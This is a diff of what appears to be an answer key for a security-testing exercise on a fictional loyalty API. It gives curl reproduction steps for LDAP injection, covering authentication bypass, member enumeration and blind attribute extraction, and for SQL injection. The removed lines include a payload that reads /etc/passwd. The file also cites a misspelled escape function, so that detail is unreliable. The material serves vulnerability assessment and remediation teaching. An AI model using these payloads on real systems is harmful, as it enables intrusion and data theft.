@@ -1,63 +1,60 @@
 # Expected Response
 
 ## System
-- Domain: Retail / Loyalty Programme
-- System: RewardCore Loyalty API
+- System: RewardCore Loyalty API v1.7.0
+- Domain: RETAIL / LOYALTY PROGRAMME
 - Example ID: INJ-0123
-- Vulnerability: LDAP Injection
+- Risk ID: RISK-INJ-123
 
-## Priority Findings
+## Findings
 
-### Finding 1: LDAP Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. LDAP Injection on `/api/v3/orders?filter=` — Authentication Bypass + Member Enumeration (Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables LDAP Injection (LDAPi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `filter` parameter on `GET /api/v3/orders` is interpolated directly into an LDAP search filter (`(&(objectClass=user)(cn=${filter}))`). An attacker can inject LDAP special characters to break out of the `cn=` attribute and inject additional filter conditions, bypassing loyalty member authentication and enumerating all directory accounts.
 
-**Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=admin)(&(password=*))`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = 'admin)(&(password=*))'`
-  evaluates to true for all rows when the payload is `admin)(&(password=*))`
+HAR shows `filter=admin)(&(password=*))` returning HTTP 200 with all loyalty member records including admin credentials. The HAR response shows SQL-structured records — both LDAP and SQL paths execute on the same endpoint (see Finding 2).
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
-
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.rewardcore-loya.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching loyalty orders only.
 
-### Step 2 — Inject LDAPi payload
+**Step 2 — LDAP authentication bypass: inject condition to match all passwords (primary HAR attack):**
 ```bash
-curl -s "https://api.rewardcore-loya.example.com/api/v1/users?search=admin)(&(password=*))" \
+curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=admin)(%26(password%3D*))" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+Injected LDAP filter: `(&(objectClass=user)(cn=admin)(&(password=*)))` — matches any admin account with any password.
+**Vulnerable outcome:** Admin loyalty account credentials returned — LDAP authentication bypassed.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — LDAP wildcard: enumerate all loyalty programme members:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=*)((objectClass%3D*)" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+Injected LDAP filter: `(&(objectClass=user)(cn=*)((objectClass=*)))` — wildcard matches all directory entries.
+**Vulnerable outcome:** All loyalty programme member accounts listed — full directory enumeration.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — Blind LDAP injection: enumerate attribute values character by character:**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+# Probe whether admin's email starts with 'a'
+curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=admin)(mail%3Da*)" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** Non-empty response confirms email starts with `a` — blind LDAP attribute extraction without direct output.
+
+### 2. SQL Injection on `/api/v3/orders?filter=` — Secondary (Legacy SQL Path, RISK-INJ-123)
+
+HAR response shows SQL-structured records — legacy SQL path active on same endpoint.
+
+**Step 5 — SQL tautology (legacy SQL path):**
+```bash
+curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=%27%20OR%201%3D1%20--" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** All loyalty order records returned.
 
 ## Secure Outcome
 ```json
@@ -65,8 +62,8 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- Escape LDAP special characters (`(`, `)`, `*`, `\`, `\0`) in `filter` before constructing the LDAP search filter (RISK-INJ-123). Use `ldapjs.escapeFiler()` or equivalent.
+- Reject inputs containing LDAP metacharacters at the API layer.
+- Replace legacy SQL string concatenation with parameterized queries.
+- Restrict service account LDAP bind to minimum required attributes.
+- Disable verbose error messages in production.
